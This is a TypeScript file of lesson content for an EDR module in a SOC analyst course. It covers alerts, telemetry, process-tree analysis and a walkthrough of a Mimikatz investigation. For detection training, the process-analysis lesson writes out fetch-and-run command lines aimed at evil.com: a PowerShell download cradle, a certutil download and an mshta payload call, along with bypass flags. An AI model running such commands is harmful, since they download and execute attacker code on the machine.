import { LessonContent } from "../../lessonContent";

export const module8: LessonContent[] = [

    
  // =========================================
  // MODULE 8: ENDPOINT DETECTION & RESPONSE
  // =========================================
  {
    id: "8.1",
    courseId: "soc-fundamentals",
    title: "What is EDR?",
    content: `
# What is EDR?

**Endpoint Detection and Response (EDR)** is a security technology that continuously monitors endpoints to detect, investigate, and respond to cyber threats.

## Evolution of Endpoint Security

\`\`\`
Traditional Antivirus              EDR
        │                           │
  Signature-based            Behavioral analysis
  Periodic scans             Real-time monitoring
  Known threats only         Unknown threat detection
  Limited visibility         Full telemetry
  Manual response            Automated response
\`\`\`

## Core EDR Capabilities

### 1. Continuous Monitoring

EDR agents run 24/7, watching:
- Process execution
- File system changes
- Registry modifications
- Network connections
- Memory operations
- User activities

### 2. Detection

\`\`\`
DETECTION METHODS

┌─────────────────────────────────────────────────────────┐
│  Signature-Based                                        │
│  └─ Known malware hashes, patterns                      │
├─────────────────────────────────────────────────────────┤
│  Behavioral Analysis                                    │
│  └─ Suspicious behavior patterns (even for new threats) │
├─────────────────────────────────────────────────────────┤
│  Machine Learning                                       │
│  └─ Anomaly detection, classification models            │
├─────────────────────────────────────────────────────────┤
│  Threat Intelligence                                    │
│  └─ IOCs from global threat feeds                       │
└─────────────────────────────────────────────────────────┘
\`\`\`

### 3. Investigation

EDR provides rich data for investigation:
- Full process tree visualization
- File and registry timeline
- Network connection history
- User session context
- Related alerts and incidents

### 4. Response

Automated and manual response options:

| Capability | Description |
|------------|-------------|
| Isolate | Cut off network access |
| Kill Process | Terminate malicious processes |
| Quarantine | Isolate suspicious files |
| Remediate | Remove malware and artifacts |
| Rollback | Restore to previous state |

## EDR Architecture

\`\`\`
                    ┌─────────────────────────────────┐
                    │     EDR Management Console      │
                    │  (Cloud or On-Premise)          │
                    └─────────────┬───────────────────┘
                                  │
              ┌───────────────────┼───────────────────┐
              │                   │                   │
              ↓                   ↓                   ↓
    ┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐
    │   EDR Agent     │ │   EDR Agent     │ │   EDR Agent     │
    │   Workstation   │ │     Server      │ │     Laptop      │
    └─────────────────┘ └─────────────────┘ └─────────────────┘
           │                   │                   │
           ↓                   ↓                   ↓
    ┌─────────────────────────────────────────────────────────┐
    │              Telemetry Data Collection                   │
    │  • Processes  • Files  • Registry  • Network  • Memory  │
    └─────────────────────────────────────────────────────────┘
\`\`\`

## Popular EDR Solutions

### Enterprise Solutions

| Vendor | Product | Key Strength |
|--------|---------|--------------|
| CrowdStrike | Falcon | Cloud-native, threat intel |
| Microsoft | Defender for Endpoint | Windows integration |
| SentinelOne | Singularity | AI-powered automation |
| Carbon Black | CB Defense | Process visibility |
| Palo Alto | Cortex XDR | Multi-vector detection |

### What SOC Analysts Need to Know

**Console Navigation:**
- Dashboard and alert queue
- Host search and investigation
- Process tree analysis
- Response action execution

**Key Skills:**
- Understanding alert severity and confidence
- Process tree interpretation
- File and registry analysis
- Network connection review
- Response action selection

## EDR vs Traditional AV

\`\`\`
Feature           │ Antivirus │ EDR
──────────────────┼───────────┼──────────
Detection Method  │ Signatures│ Behavioral + Signatures
Visibility        │ Limited   │ Full telemetry
Investigation     │ Basic     │ Rich context
Response          │ Block only│ Isolate, remediate, rollback
Threat Hunting    │ No        │ Yes
Cloud Analysis    │ No        │ Yes
Cost              │ Low       │ Higher
\`\`\`

## Why EDR Matters for SOC

1. **Rich Telemetry** - See exactly what happened
2. **Fast Response** - Contain threats in seconds
3. **Investigation Power** - Drill down into details
4. **Threat Hunting** - Proactively search for threats
5. **Automation** - Reduce manual workload
    `,
    keyTakeaways: [
      "EDR provides continuous endpoint monitoring and behavioral detection",
      "Core capabilities: monitoring, detection, investigation, and response",
      "EDR offers rich telemetry including process, file, registry, and network data",
      "Response actions include isolation, process termination, and remediation",
      "SOC analysts use EDR for alert investigation and threat containment"
    ],
    additionalResources: [
      { title: "CrowdStrike University", type: "documentation", url: "https://www.crowdstrike.com" },
      { title: "Microsoft Defender for Endpoint Docs", type: "documentation", url: "https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/" }
    ]
  },
  {
    id: "8.2",
    courseId: "soc-fundamentals",
    title: "EDR Alerts & Telemetry",
    content: `
# EDR Alerts & Telemetry

Understanding EDR alerts and the telemetry behind them is crucial for effective investigation.

## Anatomy of an EDR Alert

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│ ALERT: Suspicious PowerShell Execution                         │
├─────────────────────────────────────────────────────────────────┤
│ Severity: HIGH      Confidence: 90%      Category: Execution   │
├─────────────────────────────────────────────────────────────────┤
│ Hostname: FINANCE-PC-08                                         │
│ Username: jsmith                                                 │
│ Timestamp: 2024-01-15 14:22:35 UTC                              │
├─────────────────────────────────────────────────────────────────┤
│ Detection: PowerShell with encoded command spawned from        │
│           suspicious parent process (WINWORD.EXE)              │
├─────────────────────────────────────────────────────────────────┤
│ Process: powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0A...      │
│ Parent:  WINWORD.EXE (Microsoft Word)                          │
│ File:    C:\\Users\\jsmith\\Downloads\\Invoice.doc              │
├─────────────────────────────────────────────────────────────────┤
│ MITRE ATT&CK: T1059.001 - PowerShell                           │
│              T1566.001 - Spear Phishing Attachment             │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

## Alert Severity Levels

| Level | Description | Typical Response |
|-------|-------------|------------------|
| Critical | Active attack, high confidence | Immediate action |
| High | Likely malicious, investigation needed | Priority review |
| Medium | Suspicious, may be benign | Same-day triage |
| Low | Anomalous but likely benign | Batch review |
| Informational | Context for other alerts | Reference only |

## Types of EDR Telemetry

### Process Telemetry

\`\`\`
PROCESS EVENT

Event Type: Process Creation
Timestamp: 2024-01-15 14:22:35.421 UTC

Process Details:
├── PID: 4892
├── Name: powershell.exe
├── Path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
├── Command Line: powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0A...
├── Hash (SHA256): a5d2f8...
├── Signature: Signed by Microsoft
└── Integrity Level: Medium

Parent Process:
├── PID: 2156
├── Name: WINWORD.EXE
├── Path: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
└── User: DOMAIN\\jsmith
\`\`\`

### File Telemetry

\`\`\`
FILE EVENTS

[WRITE] 14:22:34.102 UTC
Path: C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.dll
Size: 245,760 bytes
Hash: b7c8d9e0f1...
Written by: powershell.exe (PID 4892)

[EXECUTE] 14:22:35.891 UTC
Path: C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.dll
Loaded by: rundll32.exe (PID 5124)
Export: DllRegisterServer
\`\`\`

### Network Telemetry

\`\`\`
NETWORK CONNECTIONS

[OUTBOUND] 14:22:36.156 UTC
Process: rundll32.exe (PID 5124)
Source: 10.0.1.108:49822
Destination: 185.234.218.45:443
Protocol: HTTPS
Bytes Sent: 1,024
Bytes Received: 2,048
Status: Established

[DNS] 14:22:35.982 UTC
Query: evil-c2-server.com
Response: 185.234.218.45
Requested by: payload.dll (loaded in rundll32.exe)
\`\`\`

### Registry Telemetry

\`\`\`
REGISTRY EVENTS

[SETVALUE] 14:22:37.234 UTC
Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
Value: Updater
Data: C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.dll
Process: rundll32.exe (PID 5124)

Analysis: Persistence mechanism - runs on user login
\`\`\`

## Reading Process Trees

Process trees show parent-child relationships:

\`\`\`
PROCESS TREE VISUALIZATION

explorer.exe (PID 1024)
└── outlook.exe (PID 2048)
    └── WINWORD.EXE (PID 2156)        [!] Opened malicious doc
        └── powershell.exe (PID 4892) [!] Encoded command
            └── rundll32.exe (PID 5124)[!] Loaded payload

SUSPICIOUS INDICATORS:
• Office app spawning PowerShell
• Encoded PowerShell commands
• rundll32 executing downloaded DLL
\`\`\`

### Normal vs Suspicious Trees

**Normal:**
\`\`\`
explorer.exe
└── chrome.exe
    └── chrome.exe (child processes)
\`\`\`

**Suspicious:**
\`\`\`
explorer.exe
└── EXCEL.EXE
    └── cmd.exe           [!] Why is Excel running cmd?
        └── powershell.exe [!] PowerShell from cmd from Excel
\`\`\`

## Alert Triage with EDR

### Investigation Workflow

\`\`\`
1. ALERT REVIEW
   └─ Read alert summary and severity
   
2. PROCESS CONTEXT
   └─ Examine process tree
   └─ Check command line arguments
   └─ Review parent process legitimacy

3. FILE ANALYSIS
   └─ Check file reputation
   └─ Review file origin
   └─ Examine modifications

4. NETWORK CONTEXT
   └─ Check destination IP/domain reputation
   └─ Review connection timing
   └─ Look for beaconing patterns

5. USER CONTEXT
   └─ Is this normal for this user?
   └─ Recent user activity
   └─ Login location/time

6. VERDICT
   └─ True positive → Respond
   └─ False positive → Tune
   └─ Needs escalation → Escalate
\`\`\`
    `,
    keyTakeaways: [
      "EDR alerts include severity, confidence, detection logic, and MITRE mapping",
      "Key telemetry types: process, file, network, and registry events",
      "Process trees reveal parent-child relationships and attack chains",
      "Office applications spawning scripting engines is a major red flag",
      "Effective triage combines process, file, network, and user context"
    ],
    practicalExercise: {
      title: "EDR Alert Analysis",
      description: "Practice analyzing EDR alerts and telemetry data.",
      steps: [
        "Review the sample EDR alert provided",
        "Draw the process tree from the telemetry",
        "Identify all suspicious indicators",
        "Determine if the alert is a true or false positive",
        "Document your analysis and verdict"
      ]
    }
  },
  {
    id: "8.3",
    courseId: "soc-fundamentals",
    title: "Process Analysis Basics",
    content: `
# Process Analysis Basics

Understanding process behavior is fundamental to EDR investigation. This lesson covers how to analyze processes for signs of malicious activity.

## Process Fundamentals

Every Windows process has key attributes:

\`\`\`
PROCESS ATTRIBUTES

┌─────────────────────────────────────────────────────────────┐
│ IDENTIFICATION                                              │
├─────────────────────────────────────────────────────────────┤
│ Process Name: powershell.exe                                │
│ PID: 4892                                                   │
│ Parent PID: 2156                                            │
│ Session ID: 1 (user session)                                │
└─────────────────────────────────────────────────────────────┘
│ EXECUTION CONTEXT                                           │
├─────────────────────────────────────────────────────────────┤
│ User: DOMAIN\\jsmith                                         │
│ Integrity Level: Medium                                     │
│ Token Privileges: SeDebugPrivilege (DISABLED)               │
│ Start Time: 2024-01-15 14:22:35 UTC                         │
└─────────────────────────────────────────────────────────────┘
│ FILE INFORMATION                                            │
├─────────────────────────────────────────────────────────────┤
│ Path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\          │
│ Hash: SHA256 a5d2f8...                                      │
│ Signature: Microsoft Windows                                │
│ Compile Time: 2023-05-15                                    │
└─────────────────────────────────────────────────────────────┘
\`\`\`

## Suspicious Process Indicators

### 1. Unusual Parent-Child Relationships

\`\`\`
SUSPICIOUS SPAWNING PATTERNS

Office Applications → Scripting Engines
├── WINWORD.EXE → powershell.exe    [!]
├── EXCEL.EXE → cmd.exe             [!]
├── OUTLOOK.EXE → wscript.exe       [!]

Browser → System Tools
├── chrome.exe → cmd.exe            [!]
├── firefox.exe → powershell.exe    [!]

Services → Unexpected Children
├── services.exe → cmd.exe          [!]
├── wmiprvse.exe → powershell.exe   [!]
\`\`\`

### 2. Suspicious Command Lines

**Encoded Commands:**
\`\`\`powershell
# Suspicious - Base64 encoded
powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0A...

# Suspicious - Download cradle
powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')

# Suspicious - Bypass flags
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden
\`\`\`

**Suspicious Parameters:**
\`\`\`cmd
# Hidden execution
cmd.exe /c start /min
wscript.exe //B //E:jscript

# LOLBAS usage
certutil.exe -urlcache -split -f http://evil.com/malware.exe
mshta.exe http://evil.com/payload.hta
\`\`\`

### 3. Unusual Process Paths

\`\`\`
EXPECTED LOCATIONS

powershell.exe  → C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\
cmd.exe         → C:\\Windows\\System32\\
svchost.exe     → C:\\Windows\\System32\\

SUSPICIOUS LOCATIONS

powershell.exe  → C:\\Users\\Public\\powershell.exe         [!]
svchost.exe     → C:\\Windows\\Temp\\svchost.exe            [!]
cmd.exe         → C:\\ProgramData\\cmd.exe                  [!]
\`\`\`

### 4. Process Masquerading

Attackers disguise processes:

\`\`\`
LEGITIMATE                          MASQUERADING
svchost.exe                        svch0st.exe (zero instead of 'o')
services.exe                       service.exe (missing 's')
csrss.exe                          cssrs.exe (letters swapped)
lsass.exe                          lsasss.exe (extra 's')
\`\`\`

## Common Attack Techniques

### Living Off the Land (LOLBAS)

Legitimate tools used maliciously:

| Tool | Malicious Use |
|------|---------------|
| certutil.exe | Download files |
| mshta.exe | Execute HTA files |
| regsvr32.exe | Execute scripts |
| rundll32.exe | Execute DLLs |
| wmic.exe | Process execution |
| bitsadmin.exe | Download files |

### Process Injection

Signs of process injection:

\`\`\`
INJECTION INDICATORS

1. Unexpected memory allocations
   └─ VirtualAlloc in remote process

2. Suspicious thread creation
   └─ CreateRemoteThread

3. Normal process with unusual behavior
   └─ notepad.exe making network connections

4. Hollowed processes
   └─ Process image doesn't match on-disk file
\`\`\`

## Baseline Knowledge: Normal Process Behavior

### Critical Windows Processes

\`\`\`
PROCESS: svchost.exe
Normal:
├── Parent: services.exe ONLY
├── Path: C:\\Windows\\System32\\svchost.exe
├── Command: svchost.exe -k [service group]
├── Multiple instances (normal)
Suspicious:
├── Parent other than services.exe
├── Running from wrong path
├── No -k parameter

PROCESS: lsass.exe
Normal:
├── Parent: wininit.exe
├── Path: C:\\Windows\\System32\\lsass.exe
├── Single instance only
├── High integrity level
Suspicious:
├── Multiple instances
├── Wrong parent or path
├── Credential dumping attempts

PROCESS: csrss.exe
Normal:
├── Parent: (no parent - first process)
├── Path: C:\\Windows\\System32\\csrss.exe
├── Session 0 and per user session
Suspicious:
├── Has a visible parent
├── Wrong path
├── Unusual child processes
\`\`\`

## Process Analysis Checklist

\`\`\`
□ Is the process name spelled correctly?
□ Is it running from the expected path?
□ Is the parent process legitimate?
□ Are the command-line arguments suspicious?
□ Is the process signed by a trusted publisher?
□ Is the behavior normal for this process type?
□ Are there network connections that are unusual?
□ Are child processes expected?
\`\`\`
    `,
    keyTakeaways: [
      "Process analysis requires understanding normal parent-child relationships",
      "Office apps spawning scripting engines is a critical red flag",
      "Unusual paths and misspelled names indicate masquerading",
      "LOLBAS techniques use legitimate tools for malicious purposes",
      "Know the normal behavior of critical Windows processes"
    ],
    practicalExercise: {
      title: "Process Tree Analysis",
      description: "Analyze process trees to identify malicious activity.",
      steps: [
        "Review three sample process trees",
        "Identify the parent-child relationship anomalies",
        "Flag suspicious command-line arguments",
        "Determine which processes are masquerading",
        "Write a verdict for each process tree"
      ]
    }
  },
  {
    id: "8.4",
    courseId: "soc-fundamentals",
    title: "Hands-On: EDR Investigation",
    content: `
# Hands-On: EDR Investigation

Let's walk through a complete EDR investigation from alert to resolution.

## Scenario

\`\`\`
ALERT DETAILS

Alert Name: Credential Dumping Attempt Detected
Severity: CRITICAL
Confidence: 95%
Timestamp: 2024-01-15 02:34:17 UTC
Hostname: DC-PRIMARY
Username: SYSTEM
MITRE ATT&CK: T1003.001 - LSASS Memory Dumping

Detection: Process accessed LSASS memory with suspicious pattern
Process: rundll32.exe
Command: rundll32.exe C:\\Windows\\Temp\\debug.dll,DllMain
\`\`\`

## Step 1: Initial Assessment

### Alert Context

\`\`\`
CRITICAL FACTORS:
☑ Domain Controller - highest value target
☑ LSASS access - credential theft technique
☑ Unusual DLL location (Windows\\Temp)
☑ Running as SYSTEM - high privileges
☑ 2:34 AM - outside business hours

VERDICT: High priority, investigate immediately
\`\`\`

## Step 2: Process Tree Analysis

\`\`\`
PROCESS TREE

winlogon.exe (PID 512)
└── services.exe (PID 624)
    └── svchost.exe -k netsvcs (PID 892)
        └── WmiPrvSE.exe (PID 2048)          [1] WMI activity
            └── powershell.exe (PID 3156)    [2] PS execution
                └── cmd.exe (PID 3892)        [3] cmd child
                    └── rundll32.exe (PID 4212)[4] LSASS access

ANALYSIS:
[1] WmiPrvSE.exe - WMI can be used for remote execution
[2] PowerShell spawned from WMI - suspicious!
[3] cmd.exe child - executing commands
[4] rundll32.exe - the credential dumping attempt
\`\`\`

### Command Line Details

\`\`\`
[PID 2048] WmiPrvSE.exe
Command: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -Embedding
Analysis: WMI host process, can be abused for remote execution

[PID 3156] powershell.exe
Command: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "IEX..."
Analysis: 
  • -NoP = No Profile
  • -NonI = Non-Interactive
  • -W Hidden = Hidden Window
  • -Exec Bypass = Bypass execution policy
  • ALL are evasion flags!

[PID 3892] cmd.exe
Command: cmd.exe /c certutil -urlcache -f http://10.0.1.50/debug.dll C:\\Windows\\Temp\\debug.dll
Analysis: Downloaded malicious DLL using certutil (LOLBAS)

[PID 4212] rundll32.exe
Command: rundll32.exe C:\\Windows\\Temp\\debug.dll,DllMain
Analysis: Executed downloaded DLL
\`\`\`

## Step 3: Network Analysis

\`\`\`
NETWORK CONNECTIONS

[PID 3892] 02:34:05 UTC
Protocol: HTTP
Destination: 10.0.1.50:80
File Downloaded: debug.dll (245KB)

WHOIS/LOOKUP: 10.0.1.50
└── Internal IP - likely compromised internal system
└── Hostname: WORKSTATION-42

CONCLUSION: Attack originated from internal host
\`\`\`

## Step 4: File Analysis

\`\`\`
FILE: C:\\Windows\\Temp\\debug.dll

Properties:
├── Size: 245,760 bytes
├── Created: 2024-01-15 02:34:05 UTC
├── Hash: SHA256 7e8f9a0b1c2d3e4f...
├── Signature: UNSIGNED
└── VirusTotal: 45/70 detections

Detection Names:
├── Mimikatz variant
├── Credential stealer
├── HackTool:Win64/Mikatz

VERDICT: Confirmed malicious - Mimikatz credential dumper
\`\`\`

## Step 5: Impact Assessment

\`\`\`
LSASS ACCESS ANALYSIS

Memory regions accessed:
└── Credential storage regions

Potential impact:
☑ All domain credentials at risk
☑ Password hashes exposed
☑ Kerberos tickets compromised
☑ Golden ticket possible

AFFECTED ACCOUNTS:
├── Domain Admins
├── Service accounts
├── Recently logged-in users
└── All cached credentials
\`\`\`

## Step 6: Attack Timeline

\`\`\`
TIMELINE RECONSTRUCTION

01:15:23 - Attacker compromises WORKSTATION-42 (initial access)
02:30:45 - WMI used for lateral movement to DC-PRIMARY
02:33:12 - PowerShell downloads attack tools
02:34:05 - Certutil downloads Mimikatz variant
02:34:15 - DLL executed via rundll32
02:34:17 - LSASS memory accessed (DETECTION)
02:34:45 - EDR terminates process (automatic response)

DWELL TIME: Approximately 1 hour 15 minutes
\`\`\`

## Step 7: Containment Actions

\`\`\`
IMMEDIATE ACTIONS TAKEN

[02:35:00] EDR Automatic Response
☑ Killed rundll32.exe process
☑ Quarantined debug.dll
☑ Alert generated

[02:40:00] SOC Response
☑ Isolated DC-PRIMARY from network
☑ Isolated WORKSTATION-42 (source)
☑ Notified IR team lead
☑ Initiated password reset for domain admins

[02:55:00] IR Team Actions
☑ Memory dump collected from DC
☑ Forensic imaging initiated
☑ krbtgt password reset scheduled
\`\`\`

## Step 8: Documentation

\`\`\`
INCIDENT SUMMARY

Ticket: INC-2024-0023
Severity: CRITICAL (1)
Category: Credential Theft - Mimikatz

Attack Chain:
1. Initial compromise of WORKSTATION-42 (unknown vector)
2. Lateral movement to DC-PRIMARY via WMI
3. Mimikatz variant downloaded and executed
4. LSASS memory accessed for credential dumping

Impact:
- Domain credentials likely compromised
- Full domain compromise possible

Containment:
- Both systems isolated
- Attack process terminated
- Malicious DLL quarantined

Required Actions:
- Reset all domain admin passwords
- Reset krbtgt password (twice, 10 hours apart)
- Investigate WORKSTATION-42 for initial vector
- Forest-wide credential reset recommended
\`\`\`

## Lessons Learned

**What EDR Did Well:**
- Detected LSASS access in real-time
- Automatically terminated the attack
- Provided full visibility into attack chain

**Investigation Key Points:**
- Process tree revealed lateral movement path
- Command line analysis showed evasion techniques
- Network data identified internal source
- File analysis confirmed Mimikatz
    `,
    keyTakeaways: [
      "EDR provides the telemetry needed to reconstruct attack chains",
      "Process trees reveal lateral movement and attack progression",
      "Command line analysis exposes evasion techniques",
      "LSASS access on domain controllers is a critical security event",
      "Credential theft on DCs may require forest-wide password resets"
    ],
    practicalExercise: {
      title: "EDR Investigation Scenario",
      description: "Work through an EDR alert investigation independently.",
      steps: [
        "Review the provided EDR alert and telemetry",
        "Build the process tree from the data",
        "Analyze command lines for suspicious indicators",
        "Check network connections and file operations",
        "Document your findings and recommend actions"
      ]
    }
  },
  {
    id: "8.5",
    courseId: "soc-fundamentals",
    title: "Detection Engineering Quiz",
    content: `
# Detection Engineering Quiz

Evaluate your skills in creating detection rules and analytics.

## Quiz Overview

This quiz covers the detection engineering concepts from Module 8:
- Detection rule development
- False positive management
- Rule tuning and optimization
- MITRE ATT&CK integration
- Detection validation

## Instructions

1. **Duration**: 30 minutes
2. **Questions**: 5 multiple-choice questions
3. **Passing Score**: 75% (4 out of 5 questions)
4. **Attempts**: Unlimited - retake if needed

## Key Topics to Review

Before taking the quiz, make sure you understand:
- Detection rule logic and syntax
- False positive analysis and reduction
- Rule tuning methodologies
- MITRE ATT&CK mapping
- Detection testing and validation
- Performance optimization

## Taking the Quiz

Click the "Start Quiz" button below when you're ready. the quiz will cover:
- Detection rule creation
- False positive handling
- Rule optimization
- ATT&CK framework usage
- Validation techniques

Good luck! Detection engineering enhances threat detection capabilities.
    `,
    keyTakeaways: [
      "Detection rules transform threat intelligence into automated defenses",
      "False positive analysis is essential for maintaining rule effectiveness",
      "Rule tuning balances detection capability with operational efficiency",
      "MITRE ATT&CK provides a framework for comprehensive detection coverage",
      "Continuous validation ensures detection rules remain effective"
    ],
    practicalExercise: {
      title: "Quiz Preparation",
      description: "Review detection engineering concepts before taking the quiz.",
      steps: [
        "Study detection rule development principles",
        "Learn false positive analysis techniques",
        "Review rule tuning methodologies",
        "Understand ATT&CK mapping",
        "Take the quiz when ready"
      ]
    }
  }
];
